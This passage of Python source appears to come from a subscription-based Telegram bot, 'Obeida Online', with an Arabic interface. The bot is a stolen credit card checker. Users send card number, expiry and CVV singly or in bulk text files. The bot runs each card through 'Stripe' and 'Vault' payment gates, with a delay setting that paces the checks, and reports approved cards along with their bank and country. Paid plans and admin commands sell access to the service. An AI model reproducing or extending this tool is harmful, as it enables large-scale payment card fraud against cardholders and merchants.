                "joined_date": datetime.now().isoformat(),
                "is_admin": user.id in ADMIN_IDS,
                "usage": {"total_checks": 0, "approved": 0, "declined": 0},
                "default_gate": "stripe"
            }
            DataManager.save_users(users)
        
        default_gate = DataManager.get_user_default_gate(user.id)
        default_gate_name = GATES.get(default_gate, {}).get("name", "Stripe")
        
        settings = DataManager.load_settings()
        current_delay = settings.get("delay_between_cards", 5)
        
        welcome = f"""
✨ <b>مرحباً بك في بوت Obeida Online</b> ✨

<b>🚪 البوابة الافتراضية:</b> {default_gate_name}
<b>⏱️ المدة بين البطاقات:</b> {current_delay} ثانية

<b>📝 البوابات المتاحة:</b>
💳 Stripe - فحص عبر Stripe
⚡ Vault - فحص متطور

<b>📝 الأوامر:</b>
/st - فحص بطاقة عبر Stripe
/chk - فحص بطاقة عبر Vault
/mass - فحص ملف عبر Stripe
/chkm - فحص ملف عبر Vault
/stop - إيقاف الفحص الحالي
/delay - عرض أو تغيير المدة

<b>📢 القناة:</b> {CHANNEL_USERNAME}
<b>👨‍💻 المطور:</b> {DEV_CONTACT}
"""
        
        bot.send_message(user.id if chat_type == "private" else chat_id, welcome, 
                        parse_mode='HTML', reply_markup=self.ui.main_menu(chat_type))
    
    def handle_stop(self, message):
        user_id = message.from_user.id
        
        if self.mass_manager.stop_check(user_id):
            bot.reply_to(message, "⛔ <b>تم إيقاف الفحص بنجاح</b>", parse_mode='HTML')
        else:
            bot.reply_to(message, "ℹ️ <b>لا يوجد فحص نشط حالياً</b>", parse_mode='HTML')
    
    def handle_delay(self, message):
        if not self.check_sub(message):
            return
        
        try:
            parts = message.text.strip().split()
            if len(parts) < 2:
                current_delay = DataManager.load_settings().get("delay_between_cards", 5)
                bot.reply_to(message, f"⏱️ <b>المدة الحالية:</b> {current_delay} ثانية\n\nللتغيير: <code>/delay 5</code>", parse_mode='HTML')
                return
            
            delay = int(parts[1])
            if delay < 1 or delay > 30:
                bot.reply_to(message, "⚠️ المدة بين 1 و 30 ثانية", parse_mode='HTML')
                return
            
            settings = DataManager.load_settings()
            settings["delay_between_cards"] = delay
            DataManager.save_settings(settings)
            
            bot.reply_to(message, f"✅ <b>تم تغيير المدة إلى {delay} ثانية</b>", parse_mode='HTML')
            
        except Exception as e:
            bot.reply_to(message, f"⚠️ خطأ: {str(e)[:50]}", parse_mode='HTML')
    
    def handle_profile(self, message):
        user_id = message.from_user.id
        users = DataManager.load_users()
        data = users.get(str(user_id), {})
        usage = data.get('usage', {})
        sub = data.get('subscription', {})
        default_gate = data.get('default_gate', 'stripe')
        default_gate_name = GATES.get(default_gate, {}).get("name", "Stripe")
        expiry = sub.get('expiry', 'لا يوجد')[:10] if sub.get('expiry') else 'لا يوجد'
        total = usage.get('total_checks', 0)
        approved = usage.get('approved', 0)
        declined = usage.get('declined', 0)
        
        profile = f"""
👤 <b>الملف الشخصي</b>
━━━━━━━━━━━━
<b>🆔 المعرف:</b> <code>{user_id}</code>
<b>⭐ الرتبة:</b> {'👑 مشرف' if user_id in ADMIN_IDS else '💎 مشترك' if sub.get('active') else '🔹 عادي'}
<b>🚪 البوابة الافتراضية:</b> {default_gate_name}

<b>📊 الإحصائيات:</b>
• إجمالي: {total}
• ✅ المقبولة: {approved}
• ❌ المرفوضة: {declined}
• 📈 نسبة النجاح: {(approved/total*100) if total > 0 else 0:.1f}%

<b>💎 الاشتراك:</b> {sub.get('plan', 'لا يوجد')} | ينتهي: {expiry}
━━━━━━━━━━━━
🆔 Obeida Online
"""
        bot.reply_to(message, profile, parse_mode='HTML', reply_markup=self.ui.back_button())
    
    def handle_stats(self, message):
        stats = DataManager.load_stats()
        today = datetime.now().strftime("%Y-%m-%d")
        daily = stats.get("daily_stats", {}).get(today, {"checks": 0, "approved": 0})
        total = stats.get('total_checks', 0)
        approved = stats.get('total_approved', 0)
        
        text = f"""
📊 <b>إحصائيات البوت</b>
━━━━━━━━━━━━
📅 <b>اليوم:</b> {daily['checks']} فحص | ✅ {daily['approved']}
📈 <b>الإجمالي:</b> {total} فحص
✅ المقبولة: {approved}
📊 نسبة النجاح: {(approved/total*100) if total > 0 else 0:.1f}%
━━━━━━━━━━━━
🆔 Obeida Online
"""
        bot.reply_to(message, text, parse_mode='HTML', reply_markup=self.ui.back_button())
    
    def handle_subscribe(self, message):
        sub = DataManager.get_user_subscription(message.from_user.id)
        if sub:
            expiry_date = sub.get('expiry', '')
            if expiry_date and expiry_date != "2099-12-31":
                remaining = (datetime.fromisoformat(expiry_date) - datetime.now()).days
                text = f"💎 اشتراكك نشط\n📅 ينتهي: {expiry_date[:10]}\n⏰ متبقي: {remaining} يوم"
            else:
                text = "💎 لديك اشتراك دائم"
            bot.reply_to(message, text, parse_mode='HTML')
        else:
            plans = "\n".join([f"• {p['name']}: {p['price']}" for p in SUBSCRIPTION_PLANS.values()])
            text = f"""
💎 <b>خطط الاشتراك</b>
━━━━━━━━━━━━
{plans}
━━━━━━━━━━━━
<b>للاشتراك:</b> {DEV_CONTACT}
"""
            bot.reply_to(message, text, parse_mode='HTML', reply_markup=self.ui.back_button())
    
    def handle_default_gate(self, message):
        user_id = message.from_user.id
        current_gate = DataManager.get_user_default_gate(user_id)
        bot.reply_to(message, f"⚙️ <b>اختر البوابة الافتراضية</b>\n\nالبوابة الحالية: {GATES[current_gate]['icon']} {GATES[current_gate]['name']}",
                    parse_mode='HTML', reply_markup=self.ui.default_gate_menu(current_gate))
    
    def handle_set_default_gate(self, call, gate_id):
        if DataManager.set_user_default_gate(call.from_user.id, gate_id):
            gate_name = GATES[gate_id]['name']
            bot.answer_callback_query(call.id, f"✅ تم تعيين {gate_name}")
            bot.edit_message_text(f"✅ تم تعيين {gate_name} كبوابة افتراضية",
                                 call.message.chat.id, call.message.message_id,
                                 reply_markup=self.ui.back_button())
    
    def check_single_card(self, message, card: Dict, gate: str):
        user_id = message.from_user.id
        gate_name = GATES[gate]['name']
        masked_card = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
        
        progress_msg = bot.reply_to(
            message,
            f"""
🚀  جاري الفحص 🚀
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌

𒊹︎︎︎ 𝗕𝗔𝗧𝗔𝗤𝗔𝗛 ⌁ {masked_card}
𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ جاري التحقق ◯ ◯ ◯
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
""",
            parse_mode='HTML'
        )
        
        message_id = progress_msg.message_id
        chat_id = progress_msg.chat.id
        
        stop_animation = threading.Event()
        
        def animate_circles():
            frames = ["◯ ◯ ◯", "● ◯ ◯", "● ● ◯", "● ● ●", "◯ ◯ ◯"]
            frame_index = 0
            while not stop_animation.is_set():
                try:
                    text = f"""
🚀  جاري الفحص 🚀
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌

𒊹︎︎︎ 𝗕𝗔𝗧𝗔𝗤𝗔𝗛 ⌁ {masked_card}
𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ جاري التحقق {frames[frame_index % len(frames)]}
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
"""
                    bot.edit_message_text(text, chat_id, message_id, parse_mode='HTML')
                    frame_index += 1
                    time.sleep(0.4)
                except:
                    break
        
        animation_thread = threading.Thread(target=animate_circles)
        animation_thread.start()
        
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            approved, resp = loop.run_until_complete(self.gateways.check_card(gate, card))
            loop.close()
            
            stop_animation.set()
            animation_thread.join(timeout=1)
            
            DataManager.update_usage(user_id, gate, resp)
            DataManager.save_card_result(card['original'], gate_name, resp, user_id, approved)
            
            bin_info = Helpers.get_bin_info(card['number'][:6])
            final_result = ResultFormatter.format_single_result(card['original'], resp, approved, gate_name, bin_info)
            
            bot.edit_message_text(final_result, chat_id, message_id, parse_mode='HTML')
            
        except Exception as e:
            stop_animation.set()
            animation_thread.join(timeout=1)
            bot.edit_message_text(f"⚠️ خطأ: {str(e)[:50]}", chat_id, message_id, parse_mode='HTML')
    
    def check_multiple_cards(self, message, cards: List[Dict], gate: str):
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        if self.mass_manager.is_checking(user_id):
            bot.reply_to(message, "⚠️ <b>لديك فحص نشط حالياً!</b>\nاستخدم /stop للإيقاف", parse_mode='HTML')
            return
        
        settings = DataManager.load_settings()
        delay_seconds = settings.get("delay_between_cards", 5)
        
        check_id = self.mass_manager.start_check(user_id, chat_id, cards, gate, message.message_id)
        
        start_msg = bot.reply_to(message, f"""
🚀 <b>بدء الفحص المتسلسل</b> 🚀
━━━━━━━━━━━━
📊 <b>إجمالي البطاقات:</b> {len(cards)}
🚪 <b>البوابة:</b> {GATES[gate]['icon']} {GATES[gate]['name']}
⏱️ <b>المدة:</b> {delay_seconds} ثانية
━━━━━━━━━━━━
✅ <b>المقبولة:</b> 0
❌ <b>المرفوضة:</b> 0
💡 استخدم /stop للإيقاف
""", parse_mode='HTML', reply_markup=self.ui.stop_button(check_id))
        
        check = self.mass_manager.get_check(user_id)
        if check:
            check['message_id'] = start_msg.message_id
        
        threading.Thread(target=self._run_mass_check, args=(user_id,), daemon=True).start()
    
    def _run_mass_check(self, user_id: int):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self._process_mass_check(user_id))
            loop.close()
        except Exception as e:
            print(f"Error: {e}")
    
    async def _process_mass_check(self, user_id: int):
        check = self.mass_manager.get_check(user_id)
        if not check:
            return
        
        cards = check['cards']
        gate = check['gate']
        chat_id = check['chat_id']
        gate_name = GATES[gate]['name']
        total_cards = len(cards)
        
        settings = DataManager.load_settings()
        delay_seconds = settings.get("delay_between_cards", 5)
        
        all_results = []
        message_id = check['message_id']
        
        for i, card in enumerate(cards, 1):
            check = self.mass_manager.get_check(user_id)
            if not check or check.get('stop'):
                break
            
            try:
                current_card = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
                
                progress_text = f"""
🚀 <b>جاري الفحص المتسلسل</b> 🚀
━━━━━━━━━━━━
📊 <b>إجمالي البطاقات:</b> {total_cards}
🚪 <b>البوابة:</b> {GATES[gate]['icon']} {gate_name}
━━━━━━━━━━━━
✅ <b>المقبولة:</b> {check['approved']}
❌ <b>المرفوضة:</b> {check['declined']}
🔄 <b>جاري فحص:</b> <code>{current_card}</code> ({i}/{total_cards})
━━━━━━━━━━━━
💡 استخدم /stop للإيقاف
"""
                
                await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: bot.edit_message_text(progress_text, chat_id, message_id, parse_mode='HTML')
                )
                
                approved, resp = await self.gateways.check_card(gate, card)
                
                check = self.mass_manager.get_check(user_id)
                if not check:
                    break
                
                check['checked'] += 1
                card_result = ResultFormatter.format_card_result(card['original'], resp, approved)
                all_results.append(card_result)
                
                if approved:
                    check['approved'] += 1
                    bin_info = Helpers.get_bin_info(card['number'][:6])
                    
                    approved_msg = f"""
✅ <b>بطاقة مقبولة</b>
━━━━━━━━━━━━
<b>💳 البطاقة:</b> <code>{card['original']}</code>
<b>🏷️ النوع:</b> {bin_info.get('brand', 'Unknown')}
<b>🏦 البنك:</b> {bin_info.get('bank', 'Unknown')}
<b>🌍 الدولة:</b> {bin_info.get('country', 'Unknown')} {bin_info.get('flag', '🏁')}
<b>📊 الحالة:</b> {resp}
"""
                    await asyncio.get_event_loop().run_in_executor(
                        None, lambda: bot.send_message(chat_id, approved_msg, parse_mode='HTML')
                    )
                    DataManager.save_card_result(card['original'], gate_name, resp, user_id, True)
                else:
                    check['declined'] += 1
                    DataManager.save_card_result(card['original'], gate_name, resp, user_id, False)
                
                DataManager.update_usage(user_id, gate, resp)
                await asyncio.sleep(delay_seconds)
                
            except Exception as e:
                print(f"Error: {e}")
                if check:
                    check['checked'] += 1
                    check['declined'] += 1
        
        check = self.mass_manager.get_check(user_id)
        if check and not check.get('stop'):
            results_text = ResultFormatter.format_mass_result_header(total_cards, gate_name)
            results_text += "\n".join(all_results[:50])
            results_text += ResultFormatter.format_mass_result_footer(
                check['approved'], check['declined'], total_cards
            )
            
            await asyncio.get_event_loop().run_in_executor(
                None, lambda: bot.edit_message_text(results_text, chat_id, message_id, parse_mode='HTML')
            )
        
        self.mass_manager.remove_check(user_id)
    
    def handle_single(self, message, gate):
        if not self.check_sub(message):
            return
        
        parts = message.text.strip().split(' ', 1)
        if len(parts) < 2:
            bot.reply_to(message, f"⚠️ الاستخدام: /{GATES[gate]['command']} رقم|شهر|سنة|cvv")
            return
        
        card = Helpers.parse_card(parts[1])
        if not card:
            bot.reply_to(message, "❌ صيغة غير صحيحة\nالصيغة: رقم|شهر|سنة|cvv")
            return
        
        if not Helpers.luhn_check(card['number']):
            bot.reply_to(message, "❌ البطاقة غير صالحة")
            return
        
        self.check_single_card(message, card, gate)
    
    def handle_mass(self, message, gate):
        if not self.check_sub(message):
            return
        
        if message.document:
            self.handle_file_upload(message, gate)
        else:
            last_file = self.get_last_file(message.from_user.id)
            if last_file:
                cards = Helpers.extract_cards_from_text(last_file["content"])
                if cards:
                    bot.reply_to(message, f"📁 استخدام آخر ملف: {last_file['file_name']}\n📊 {len(cards)} بطاقة")
                    self.check_multiple_cards(message, cards, gate)
                else:
                    bot.reply_to(message, "❌ لا توجد بطاقات صالحة")
            else:
                bot.reply_to(message, f"📁 أرسل ملف txt بالبطاقات\nاستخدم: /{GATES[gate]['mass_command']}")
    
    def handle_file_upload(self, message, gate=None):
        if not self.check_sub(message):
            return
        
        try:
            file = bot.get_file(message.document.file_id)
            content = bot.download_file(file.file_path).decode('utf-8', errors='ignore')
            
            cards = Helpers.extract_cards_from_text(content)
            
            if not cards:
                bot.reply_to(message, "❌ لا توجد بطاقات صالحة في الملف")
                return
            
            self.save_last_file(message.from_user.id, message.document.file_id, message.document.file_name, content)
            
            if gate is None:
                gate = DataManager.get_user_default_gate(message.from_user.id)
            
            bot.reply_to(message, f"📁 {message.document.file_name}\n📊 {len(cards)} بطاقة\n🚪 {GATES[gate]['icon']} {GATES[gate]['name']}")
            self.check_multiple_cards(message, cards, gate)
            
        except Exception as e:
            bot.reply_to(message, f"⚠️ خطأ: {str(e)[:50]}")
    
    def check_last_file(self, message):
        user_id = message.from_user.id
        last_file = self.get_last_file(user_id)
        
        if not last_file:
            bot.reply_to(message, "❌ لم تقم بإرسال أي ملف من قبل")
            return
        
        cards = Helpers.extract_cards_from_text(last_file["content"])
        
        if not cards:
            bot.reply_to(message, "❌ لا توجد بطاقات صالحة")
            return
        
        gate = DataManager.get_user_default_gate(user_id)
        bot.reply_to(message, f"📁 {last_file['file_name']}\n📊 {len(cards)} بطاقة")
        self.check_multiple_cards(message, cards, gate)
    
    def handle_add_sub(self, message):
        if message.from_user.id not in ADMIN_IDS:
            return
        
        try:
            parts = message.text.strip().split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ /addsub [ايدي] [المدة]")
                return
            
            user_id = int(parts[1])
            days = int(parts[2]) if len(parts) > 2 else 30
            
            if DataManager.add_subscription(user_id, days):
                bot.send_message(user_id, f"🎉 تم تفعيل اشتراكك لمدة {days} يوم")
                bot.reply_to(message, f"✅ تم إضافة اشتراك {days} يوم للمستخدم {user_id}")
            else:
                bot.reply_to(message, "❌ فشل")
        except Exception as e:
            bot.reply_to(message, f"❌ خطأ: {e}")
    
    def handle_remove_sub(self, message):
        if message.from_user.id not in ADMIN_IDS:
            return
        
        try:
            parts = message.text.strip().split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ /removesub [ايدي]")
                return
            
            user_id = int(parts[1])
            
            if DataManager.remove_subscription(user_id):
                bot.reply_to(message, f"✅ تم إزالة اشتراك المستخدم {user_id}")
            else:
                bot.reply_to(message, "❌ فشل")
        except Exception as e:
            bot.reply_to(message, f"❌ خطأ: {e}")

# ==================== معالج الكول باك ====================
class CallbackHandler:
    def __init__(self, handler):
        self.handler = handler
    
    def handle(self, call):
        data = call.data
        
        if data == "back_main":
            chat_type = Helpers.get_chat_type(call.message.chat.id)
            bot.edit_message_text("✨ القائمة الرئيسية", call.message.chat.id, call.message.message_id,
                                 reply_markup=UserInterface.main_menu(chat_type), parse_mode='HTML')
        
        elif data == "my_profile":
            self.handler.handle_profile(call.message)
        
        elif data == "stats":
            self.handler.handle_stats(call.message)
        
        elif data == "subscribe":
            self.handler.handle_subscribe(call.message)
        
        elif data == "default_gate":
            self.handler.handle_default_gate(call.message)
        
        elif data == "set_delay":
            current_delay = DataManager.load_settings().get("delay_between_cards", 5)
            bot.edit_message_text(
                f"⏱️ المدة الحالية: {current_delay} ثانية\n\nأرسل: <code>/delay 5</code>",
                call.message.chat.id, call.message.message_id,
                parse_mode='HTML', reply_markup=UserInterface.back_button()
            )
        
        elif data == "mass_check":
            bot.edit_message_text("📁 أرسل ملف txt بالبطاقات", call.message.chat.id, call.message.message_id,
                                 reply_markup=UserInterface.back_button())
        
        elif data == "check_last_file":
            self.handler.check_last_file(call.message)
            bot.answer_callback_query(call.id)
        
        elif data.startswith("set_default_"):
            gate_id = data.replace("set_default_", "")
            self.handler.handle_set_default_gate(call, gate_id)
        
        elif data.startswith("gate_"):
            gate = data.replace("gate_", "")
            bot.edit_message_text(f"✅ {GATES[gate]['icon']} {GATES[gate]['name']}\nأرسل: <code>/{GATES[gate]['command']} رقم|شهر|سنة|cvv</code>",
                                  call.message.chat.id, call.message.message_id,
                                  parse_mode='HTML', reply_markup=UserInterface.back_button())
        
        elif data.startswith("stop_"):
            cid = int(data.replace("stop_", ""))
            self.handler.mass_manager.stop_check(cid)
            bot.answer_callback_query(call.id, "⛔ جاري الإيقاف")

# ==================== إعداد البوت ====================
def setup():
    DataManager.init_files()
    
    handler = CommandHandler()
    callback = CallbackHandler(handler)
    
    @bot.message_handler(commands=['start'])
    def start(m): handler.handle_start(m)
    
    @bot.message_handler(commands=['help'])
    def help(m): bot.reply_to(m, "📚 استخدم /start للقائمة الرئيسية")
    
    @bot.message_handler(commands=['stop'])
    def stop(m): handler.handle_stop(m)
    
    @bot.message_handler(commands=['delay'])
    def delay(m): handler.handle_delay(m)
    
    @bot.message_handler(commands=['profile'])
    def profile(m): handler.handle_profile(m)
    
    @bot.message_handler(commands=['stats'])
    def stats(m): handler.handle_stats(m)
    
    @bot.message_handler(commands=['subscribe'])
    def sub(m): handler.handle_subscribe(m)
    
    @bot.message_handler(commands=['default'])
    def default(m): handler.handle_default_gate(m)
    
    @bot.message_handler(commands=['lastfile'])
    def lastfile(m): handler.check_last_file(m)
    
    @bot.message_handler(commands=['addsub'])
    def addsub(m): handler.handle_add_sub(m)
    
    @bot.message_handler(commands=['removesub'])
    def removesub(m): handler.handle_remove_sub(m)
    
    @bot.message_handler(commands=['st'])
    def stripe(m): handler.handle_single(m, 'stripe')
    
    @bot.message_handler(commands=['mass'])
    def stripe_mass(m): handler.handle_mass(m, 'stripe')
    
    @bot.message_handler(commands=['chk'])
    def vault(m): handler.handle_single(m, 'vault')
    
    @bot.message_handler(commands=['chkm'])
    def vault_mass(m): handler.handle_mass(m, 'vault')
    
    @bot.message_handler(content_types=['document'])
    def handle_document(m):
        if not handler.check_sub(m):
            return
        handler.handle_file_upload(m)
    
    @bot.message_handler(func=lambda m: True)
    def handle_text(m):
        if not handler.check_sub(m):
            return
        
        text = m.text.strip()
        
        if f"@{BOT_USERNAME}" in text:
            text = text.replace(f"@{BOT_USERNAME}", "").strip()
        
        cards = Helpers.extract_cards_from_text(text)
        
        if cards:
            if len(cards) == 1:
                handler.check_single_card(m, cards[0], DataManager.get_user_default_gate(m.from_user.id))
            else:
                bot.reply_to(m, f"📝 {len(cards)} بطاقة\n🔄 جاري الفحص...")
                handler.check_multiple_cards(m, cards, DataManager.get_user_default_gate(m.from_user.id))
        else:
            if Helpers.get_chat_type(m.chat.id) == "private":
                bot.reply_to(m, "⚠️ أمر غير معروف\n\nأرسل البطاقة: <code>4111111111111111|12|25|123</code>",
                            parse_mode='HTML', reply_markup=UserInterface.main_menu("private"))
    
    @bot.callback_query_handler(func=lambda c: True)
    def cb(c): callback.handle(c)
    
    def run_health():
        port = int(os.environ.get('PORT', 10000))
        with socketserver.TCPServer(("0.0.0.0", port), http.server.SimpleHTTPRequestHandler) as httpd:
            httpd.serve_forever()
    
    threading.Thread(target=run_health, daemon=True).start()
    
    print(Fore.GREEN + "🚀 البوت يعمل..." + Style.RESET_ALL)
    print(Fore.CYAN + "=" * 50 + Style.RESET_ALL)
    print(Fore.YELLOW + "📌 الأوامر:" + Style.RESET_ALL)
    print(Fore.WHITE + "   💳 /st - فحص فردي (Stripe)" + Style.RESET_ALL)
    print(Fore.WHITE + "   📁 /mass - فحص ملف (Stripe)" + Style.RESET_ALL)
    print(Fore.WHITE + "   ⚡ /chk - فحص فردي (Vault)" + Style.RESET_ALL)
    print(Fore.WHITE + "   📁 /chkm - فحص ملف (Vault)" + Style.RESET_ALL)
    print(Fore.WHITE + "   ⛔ /stop - إيقاف الفحص" + Style.RESET_ALL)
    print(Fore.CYAN + "=" * 50 + Style.RESET_ALL)
    print(Fore.GREEN + "✅ البوت جاهز!" + Style.RESET_ALL)
    
    bot.infinity_polling()

if __name__ == "__main__":
    try:
        setup()
    except KeyboardInterrupt:
        print("\n⚠️ تم الإيقاف")
        sys.exit(0)
